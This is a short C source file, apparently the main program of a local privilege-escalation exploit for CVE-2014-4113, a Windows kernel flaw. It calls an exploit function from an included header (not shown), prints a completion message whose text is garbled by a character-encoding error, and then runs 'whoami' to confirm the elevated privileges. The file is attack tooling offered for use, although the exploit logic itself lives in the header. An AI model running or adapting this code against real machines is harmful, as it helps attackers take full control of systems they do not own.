#include "CVE-2014-4113.h"

int main()
{
	if (Exploit_CVE_2014_4113())
	{
		printf("Exploit CVE-2014-4113 Íê³É...\n");
	}

	system("whoami");
	system("pause");

	return 0;
}